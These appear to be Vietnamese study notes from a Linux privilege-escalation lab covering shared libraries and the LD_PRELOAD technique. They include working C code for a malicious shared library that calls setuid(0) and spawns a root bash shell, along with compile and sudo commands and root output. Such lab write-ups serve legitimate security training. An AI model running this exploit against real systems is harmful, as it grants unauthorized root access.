# Shared Libraries

Các chương trình trên Linux thường sử dụng các dynamically linked shared object libraries (thư viện đối tượng chia sẻ liên kết động). Các thư viện chứa mã đã được biên dịch hoặc các dữ liệu khác mà nhà phát triển sử dụng để tránh việc phải viết lại cùng một đoạn mã trên nhiều chương trình khác nhau. 

Có hai loại thư viện tồn tại trong Linux:
- **Static libraries** (được biểu thị bằng phần mở rộng `.a`): Khi một chương trình được biên dịch, static library trở thành một phần cố định của chương trình và không thể bị sửa đổi.
- **Dynamically linked shared object libraries** (được biểu thị bằng phần mở rộng `.so`): Tuy nhiên, dynamic library có thể bị chỉnh sửa để kiểm soát quá trình thực thi của chương trình gọi chúng.

Có nhiều phương pháp để chỉ định vị trí của các dynamic library nhằm giúp hệ thống biết nơi tìm kiếm chúng khi thực thi chương trình:
- Sử dụng các cờ `-rpath` hoặc `-rpath-link` khi biên dịch chương trình.
- Sử dụng các biến môi trường `LD_RUN_PATH` hoặc `LD_LIBRARY_PATH`.
- Đặt các thư viện trong các thư mục mặc định `/lib` hoặc `/usr/lib`.
- Chỉ định một thư mục khác chứa các thư viện bên trong file cấu hình `/etc/ld.so.conf`.

Ngoài ra, biến môi trường `LD_PRELOAD` có thể nạp một thư viện trước khi thực thi bất kỳ binary nào. Các hàm từ thư viện này sẽ được ưu tiên hơn các hàm mặc định. Các shared object mà một binary yêu cầu có thể được xem bằng tiện ích `ldd`.

![[Screenshot 2026-09-11 at 21.06.03.png]]

Hình ảnh trên liệt kê tất cả các thư viện cần thiết cho `/bin/ls`, cùng với đường dẫn tuyệt đối của chúng.

## LD_PRELOAD Privilege Escalation

Dưới đây là một ví dụ về cách chúng ta có thể tận dụng biến môi trường [LD_PRELOAD](https://web.archive.org/web/20231214050750/https://blog.fpmurphy.com/2012/09/all-about-ld_preload.html) để leo thang đặc quyền. Để thực hiện kỹ thuật này, chúng ta cần một user có quyền sudo.

Kiểm tra quyền `sudo` của user hiện tại:

```shell
htb_student@NIX02:~$ sudo -l

Matching Defaults entries for daniel.carter on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart
```

Người dùng này có quyền khởi động lại service Apache dưới quyền `root`. Tuy nhiên, vì binary này không có trên [GTFOBins](https://gtfobins.github.io/#apache) và mục nhập trong `/etc/sudoers` được chỉ định bằng đường dẫn tuyệt đối, nên trong điều kiện bình thường chúng ta không thể tận dụng lệnh này để leo thang đặc quyền.

Mặc dù vậy, cấu hình trên có chỉ thị `env_keep+=LD_PRELOAD`, cho phép giữ lại giá trị của biến môi trường `LD_PRELOAD` khi chạy `sudo`. Do đó, chúng ta có thể khai thác điểm này để ép chương trình nạp một file shared library tùy chỉnh do chúng ta tạo ra.

Tạo mã nguồn C cho thư viện độc hại (`root.c`):

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Biên dịch đoạn mã trên thành shared library (`root.so`):

```shell
htb_student@NIX02:~$ gcc -fPIC -shared -o root.so root.c -nostartfiles
```

Cuối cùng, tiến hành leo thang đặc quyền bằng cách chỉ định biến `LD_PRELOAD` khi chạy lệnh `sudo`. Lưu ý phải chỉ định đường dẫn tuyệt đối tới file thư viện:

```shell
htb_student@NIX02:~$ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

```shell
# id
uid=0(root) gid=0(root) groups=0(root)
```
---

### Quá trình thực hành trên Target System

Kiểm tra quyền `sudo` của tài khoản `htb-student`:

![[Screenshot 2026-09-11 at 21.09.31.png]]
*Xác định quyền chạy `/usr/bin/openssl` với root và chỉ thị `env_keep+=LD_PRELOAD`*

Tải mã nguồn exploit, biên dịch thành shared library `/tmp/root.so` và thực thi khai thác qua `openssl`:

![[Screenshot 2026-09-11 at 21.26.34.png]]
*Chạy `sudo LD_PRELOAD=/tmp/root.so /usr/bin/openssl` và chiếm quyền root (`uid=0`)*


